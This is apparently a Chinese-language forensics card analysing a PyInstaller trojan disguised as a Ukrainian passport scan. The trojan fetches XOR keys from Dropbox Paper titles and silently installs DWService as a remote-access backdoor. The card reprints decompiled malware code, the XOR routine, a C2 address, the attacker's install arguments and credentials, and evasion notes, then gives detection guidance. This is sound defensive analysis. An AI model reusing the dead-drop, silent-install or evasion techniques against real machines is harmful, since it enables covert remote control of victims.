---
id: defense-forensics-pyinstaller-dropbox-dead-drop-dwservice
title: PyInstaller 木马双载荷分析：诱饵 PDF + Dropbox 标题死信箱密钥 + DWService 静默安装
type: scenario
domain: defense
path: defense/forensics
technique: pyinstaller-multistage-dropbox-deaddrop-dwservice
aliases:
- PyInstaller 双载荷木马
- Dropbox Paper 死信箱
- CESNA_B12 解密
- DWService 静默安装分析
- 乌克兰护照诱饵样本
- recast.py 木马
tags:
- forensics
- malware
- pyinstaller
- python
- dropbox
- dead-drop
- xor
- dwservice
- rmm
- rat
- windows
- ioc
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V182
  verified_at: '2026-11-06T19:57:40+08:00'
  notes: 已对照原文核对（含32张图片）；样本未实际执行；哈希、PyInstaller/Python 版本、三文档 og:title 取值、CESNA_B12 与 DWService 参数均与图文一致，SPRINDER/Kiss 辅助函数未完整展开
---

## 一句话结论

一个 PyInstaller 打包的 `.scr` 木马把入口拆成两条载荷：`recast2` 释放并打开诱饵 PDF 吸引受害者，`recast1` 从三个公开 Dropbox Paper 文档的 `og:title` 中取回 XOR 密钥与 ZIP 解压口令，解密内嵌压缩包后通过 `backuper` 调用 DWService 的静默安装参数，把合法远程管理工具装成远控后门；分析时按“解包 → 反编译入口 → 还原死信箱 → 复现 CESNA_B12 → 解 ZIP → 识别 DWService 参数”即可还原整条链。

## 原理

### 样本与打包

- 样本名伪装成乌克兰护照/身份证扫描件：`Gyepatit_s_rf_srb_Khomenko_Viktoriya_Mikolaivna_1978_08_21.scr`，18,071,544 字节，MD5 `149D2014BA1A86F18103A3B05B63B3AE`。
- Windows 属性显示其带有 `Xingtai Yali Intelligent Technology Co., Ltd.`（邢台鸭梨智能科技有限公司）的 GlobalSign 代码签名，时间戳 2025-09-26。有效签名只说明文件未被篡改，不能证明签发者可信；证书可能被窃取或滥用，只能作为线索而非归因结论。
- `pyinstxtractor-ng` 识别为 PyInstaller 2.1+、Python 3.9，CArchive 37 个文件、PYZ 261 个文件；入口候选包含 `recast.pyc`（约 13 MB，内置大量加密数据）。用 `pylingual` 可把它反编译为 `decompiled_recast.py`。

### 入口与双载荷

入口脚本很短，核心逻辑是：

```python
from recast2 import spok as step2
from recast1 import Fraid as step1

pb = '<内嵌的 Base64 PDF 数据>'
ab = '<内嵌的 Base64 ZIP 数据>'
fn = [chown('qwertyuiop67890') if i % 5 else chown('ASDFGHJKL12345')
      for i in range(15)]

step2(pb, fn)   # 释放并打开诱饵 PDF
step1(ab, '.'.join(map(str, fn)))  # 解密并安装远控
```

- `fn` 由两组字符随机取 15 个字符组成，用作 `%APPDATA%` 下随机目录名的一部分。
- `recast2.spok(pdf_bin, folder_name)` 生成 `%APPDATA%\<随机目录>\<样本名>.pdf`，先尝试从 `185.238.169.125:2834` 下载 PDF（报文为长度前缀 + PDF 内容），失败则用内置密文和固定密钥解密，最后用 `start` 打开 PDF。
- `recast1.Fraid(zip_bin, folder_name)` 负责取密钥、解密 ZIP、解压、写入 `%APPDATA%\pathfile`，再 `import backuper` 并调用 `backuper.use(...)`。

### Dropbox Paper 标题死信箱

`Fraid` 内置三个 Dropbox Paper 分享文档 ID，通过 `https://www.dropbox.com/scl/fi/<id>` 请求页面；`CARP_ENT()` 用字符串定位提取 Open Graph 标题：

```python
ide = ide[ide.find('<meta property="og:title" content="') + 35:]
ide = ide[:ide.find('" />')]
```

三个标题分别提供：

- `659,337,97,253`：CESNA_B12 的四个密钥参数；
- `AuRjiuT7KyV`：参与计算 `int(...) % 253`，作为第五个参数；
- `129X5w3VdNK`：ZIP 解压口令。

这样样本体内不保存密钥/口令，静态字符串扫描只能看到文档 ID；密钥可在云端随时修改，且请求走合法 `dropbox.com` 域名，容易穿过只按域名放行的出口策略。

### CESNA_B12 自定义 XOR

解密函数是一个状态型 XOR 流：

```python
def CESNA_B12(Saber, My_Lord, Mustand, Bastard, mooo):
    bethesda = My_Lord
    Asrabada = bytearray(Saber)
    for i in range(len(Asrabada)):
        if bethesda == 0:
            bethesda += Mustand
        bethesda = bethesda % mooo
        Asrabada[i] = Asrabada[i] ^ bethesda
        bethesda = bethesda + Bastard
    return Asrabada
```

- 初始状态为 `My_Lord`；状态为 0 时加 `Mustand`；每字节先对 `mooo` 取模，再 XOR，最后加 `Bastard`。
- PDF 使用固定密钥 `673, 211, 111, 251`；ZIP 使用 Dropbox 标题提供的 `[659, 337, 97, 253]` 与额外模数。
- 这是对称流密码，知道密钥与参数即可离线还原明文，不需要执行样本。

### DWService 静默安装

`backuper.use(name_computer)` 动态导入 `ui.installer` 并调用：

```python
ui.installer.fmain([
    '', '-silent',
    'user=p6835@yandex.ru',
    'password=daV0p26pAHOAxoA',
    'name=' + name_computer,
    'logpath=C:\\Check.log'
])
```

- 参数中的字符串被拆开拼接（如 `'-si'+'len'+'t'`），用于躲避简单字符串检测。
- DWService 是开源远程访问软件，Agent 主动连接 `www.dwservice.net`，攻击者通过浏览器登录账户即可远程控制。
- 根据 DWService 官方文档，`-silent` 表示静默安装；`user=` 是账户邮箱；`password=` 是 **Agent 安装密码**（不是账户登录密码）；`name=` 是 Agent 名称；`logpath=` 是安装日志路径。
- 因此样本把合法 RMM 工具安装到受害者机器，借助其正常 TLS 出站与云端中继实现远控，不需要自建 C2。

## 触发条件

- 受害者在 Windows 上运行 `.scr`（屏保文件本质是可执行文件）。
- 主机可出站访问 `dropbox.com`、`185.238.169.125:2834` 与 `dwservice.net`；未强制 TLS 解密或应用白名单阻断这些域名。
- `%APPDATA%` 可写；进程有权限执行 `start`、解压文件并安装 DWService。
- Dropbox Paper 文档仍公开存在且标题未被修改；否则样本无法取得密钥/口令（攻击者可通过更新文档轮换）。
- 代码签名证书在样本签名时有效；签名本身不提供任何安全保证，只影响用户/网关的信任判断。

## 分析步骤

1. **识别打包**：用 DIE/`strings`/PE overlay 判断 PyInstaller；用 `pyinstxtractor-ng` 解包，记录 PyInstaller/Python 版本、CArchive/PYZ 文件数。
2. **反编译入口**：用 `pylingual` 或其他 Python 3.9 反编译器处理 `recast.pyc`，确认 `recast1`/`recast2` 两个模块与内嵌的 `pb`、`ab` 数据。
3. **还原诱饵 PDF 逻辑**：分析 `spok` 的下载地址、长度前缀、固定密钥 `673,211,111,251` 与 `%APPDATA%` 随机目录。
4. **还原死信箱**：提取 `ansa/ansb/ansc` 三个文档 ID，按 `og:title` 提取标题；确认标题分别是密钥、模数参数与 ZIP 口令。
5. **复现解密**：实现 `CESNA_B12`，对 `B64Decode(ab)` 做 XOR 解密得到 ZIP；用第三个标题作为口令解压（可用 `pyzipper`/`unzip -P`），得到 DWService Agent 包。
6. **识别远控**：检查解压目录中的 `backuper.py`、`ui/installer.py`、`dwaggdi_x86_*.dll`、`native`、`runtime`、`main.pdf` 等文件；读取 `backuper.use` 的 `fmain` 参数，确认 `-silent`、`user=`、`password=`、`name=`、`logpath=`。
7. **对比官方包**：从 DWService 官方渠道获取 `dwagent.exe`，对比文件列表与 `installer.py` 启动逻辑；样本用 `backuper.py` 替换了官方入口，并保留了 `ui/installer.py` 的 `fmain`。
8. **提取 IOC**：样本/PDF/ZIP 哈希、下发 IP、Dropbox 文档 ID、Yandex 邮箱、Agent 安装密码、Agent 名称、`C:\Check.log`、`%APPDATA%\pathfile`、随机 15 字符目录。

## PoC

以下仅用于离线分析/取证，不连接样本中的真实地址：

```python
import base64, re, urllib.request

def og_title(share_url: str) -> str:
    html = urllib.request.urlopen(share_url, timeout=10).read().decode("utf-8", "ignore")
    m = re.search(r'<meta property="og:title" content="([^"]*)"', html)
    if not m:
        raise ValueError("og:title not found")
    return m.group(1)

def cesna_b12(data: bytes, k1: int, k2: int, k3: int, mod: int) -> bytes:
    out = bytearray(data)
    state = k1
    for i in range(len(out)):
        if state == 0:
            state += k2
        state %= mod
        out[i] ^= state
        state += k3
    return bytes(out)

# PDF 载荷：密钥在样本中固定
pdf = cesna_b12(base64.b64decode(PB_B64), 673, 211, 111, 251)

# ZIP 载荷：密钥来自 Dropbox Paper 标题（放在引号内的是占位符）
titles = [og_title(u) for u in DOC_URLS]
keys = [int(x) for x in titles[0].split(",")]          # 659,337,97,253
mod = SPRINDER(titles[1]) % keys[3]                     # SPRINDER 为样本内转换函数，需按反编译实现
zip_data = cesna_b12(base64.b64decode(AB_B64), keys[0], keys[1], keys[2], mod)
open("payload.zip", "wb").write(zip_data)
# 解压口令为 titles[2]
```

说明：`Kiss`、`Sprinder`、`UNERT` 等辅助函数在截图中未完整展开，`mod` 的精确进制/转换方式需按样本实现确认；PDF 路径的四个固定密钥则可直接复现。

## 变体与关联

- **关联：PyInstaller 解包**。`code-analysis/reverse/unpacking` 下已有 CArchive/PYZ 提取与 pyc 反编译的通用卡片，本卡侧重多阶段载荷与云端密钥。
- **关联：PyInstaller 流量解密**。`defense/forensics` 下已有 AES-GCM C2 帧解密、ransomware RSA/AES 恢复等卡；本卡的加密是自定义 XOR 流，不是标准库算法。
- **关联：合法 RMM 滥用**。`pentest/c2` 下已有签名安装器投递 NetSupport RAT 的案例；本卡是 DWService 版本，参数为 `user/password/name/logpath`，同样依赖合法云端中继。
- **变体：云文档死信箱**。除 Dropbox Paper 外，任何公开页面只要标题/描述可控且无需认证即可读取，都可承载密钥；使用多个文档可拆分密钥与口令，单个文档泄露不会暴露全部。
- **变体：诱饵文件**。`spok` 先尝试远程下载 PDF、失败再用内置密文，既保证离线可用，也让诱饵内容可远程替换（例如按地域/时间更换）。
- **归因提示**：样本同时出现中国签名、俄罗斯邮箱、乌克兰上传地，属于典型的“冲突指纹”。代码签名证书可被窃取/转售，邮箱可注册，上传地可代理；这些只能作为线索，不能单独作为归因结论。

## 检测与防御

- **邮件/下载防护**：阻断或强提示 `.scr`、`.pif`、`.com` 等可执行扩展；显示真实扩展名；对“护照/身份证扫描件”类附件提高警惕。
- **网络检测**：监控非浏览器进程访问 `dropbox.com/scl/fi/`、`dwservice.net`、`185.238.169.125:2834`；对云文档的 `og:title` 抓取行为做进程与外联关联。
- **主机检测**：关注 `%APPDATA%` 下 15 字符随机目录、`pathfile`、`C:\Check.log`、`main.pdf`、`dwaggdi_x86_*.dll`、`ui/installer.py`、`backuper.py`；检查 `dwagent.exe` 的安装参数与服务/启动项。
- **RMM 治理**：建立允许的远程管理工具清单；对 DWService/NetSupport/AnyDesk 等未授权 RMM 做应用控制与告警；定期盘点已安装 Agent。
- **签名策略**：不要仅凭“签名有效”放行；结合证书主体信誉、签发时间、文件来源、首次出现时间与沙箱行为判断。
- **YARA/静态规则**：匹配 `CESNA_B12`、`dwservice`、`pathfile`、`ui.installer`、`-silent` 与拆分字符串特征；用样本哈希做追溯。
- **应急**：隔离主机，收集 `%APPDATA%` 随机目录与 `pathfile`，检查 DWService 账户下的 Agent 列表并删除未知 Agent，重置相关邮箱/安装密码，审查出站连接与远程会话记录。
